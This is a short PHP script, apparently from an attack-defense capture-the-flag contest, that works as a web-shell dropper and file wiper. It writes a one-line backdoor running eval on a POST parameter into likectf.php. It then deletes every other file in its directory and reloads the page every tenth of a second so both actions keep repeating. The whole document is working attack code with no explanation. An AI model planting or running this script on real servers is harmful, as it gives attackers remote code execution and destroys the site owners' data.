<?php
/* 
* @Author: L3m0n
* @Date:   2015-04-21 20:29:59
* @Last Modified by:   Administrator
* @Last Modified time: 2015-04-22 00:59:26
*/
set_time_limit(0);
$a = '<?php eval($_POST[likectflala]);?>';
$self = explode("/",@$_SERVER[PHP_SELF]);
$open = opendir('./');
$num1 = count($self)-1;
//while(1){
    if(!file_exists('likectf.php')){
        file_put_contents('likectf.php',$a);
    }
    while($file = readdir($open)){
        if($file!=$self[$num1] && $file!='likectf.php'){
            @unlink($file);
        }
    }
//}
echo '<meta http-equiv="refresh" content="0.1">';
?>